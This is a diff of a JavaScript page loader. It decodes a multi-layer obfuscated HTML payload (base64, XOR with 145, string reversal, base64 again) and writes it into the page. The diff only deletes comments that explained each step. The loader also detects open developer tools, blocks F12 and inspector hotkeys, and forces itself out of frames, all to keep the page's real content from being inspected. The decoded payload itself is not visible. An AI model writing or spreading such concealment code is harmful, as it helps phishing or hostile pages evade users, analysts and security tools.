@@ -360,27 +360,27 @@ VhhqJk.push("68Oi8/io/PL4ocXL5df88/bU1vX9oNbBusDGyP351sHapfvY5Mf82Kjy/PP56dbY4qD
 VhhqJk.push("+9K65sbzofnW2NfTx8bE36HF1NfSwQ==");
 var zVxnsN=VhhqJk.join("");
 
-// L4 decode: base64 -> raw XOR'd bytes
+
 var uenRih=atob(zVxnsN);
 var xVdtht="";
 for(var RuJNdD=0;RuJNdD<uenRih.length;RuJNdD++){
     xVdtht+=String.fromCharCode(uenRih.charCodeAt(RuJNdD)^145);
 }
 
-// L2 decode: reverse
+
 xVdtht=xVdtht.split("").reverse().join("");
 
-// L1 decode: base64 -> real HTML bytes (binary string)
+
 var _rawHtml=atob(xVdtht);
 
-// ★★ UTF-8 FIX ★★ — convert binary string back to proper UTF-8
+
 var SItfnq=new Uint8Array(_rawHtml.length);
 for(var qyvgZr=0;qyvgZr<_rawHtml.length;qyvgZr++){
     SItfnq[qyvgZr]=_rawHtml.charCodeAt(qyvgZr);
 }
 var rcVXZW=new TextDecoder("utf-8").decode(SItfnq);
 
-// ── ANTI-DEVTOOLS ──
+
 var AaPboV=function(){
     var w=window.outerWidth-window.innerWidth;
     var h=window.outerHeight-window.innerHeight;
@@ -393,7 +393,6 @@ var AaPboV=function(){
     return false;
 };
 
-// ── BLOCK HOTKEYS ──
 var FQWONq=function(e){
     var k=e.keyCode||e.which;
     if(k===123) return false;
@@ -402,10 +401,10 @@ var FQWONq=function(e){
     if(e.metaKey&&e.altKey&&[73,74,67].indexOf(k)>-1) return false;
 };
 
-// ── ANTI-IFRAME ──
+
 try{ if(window.top!==window.self) window.top.location=window.self.location; }catch(e){}
 
-// ── WRITE ──
+
 var lLyxgM=function(){
     if(AaPboV()) return;
     document.open();
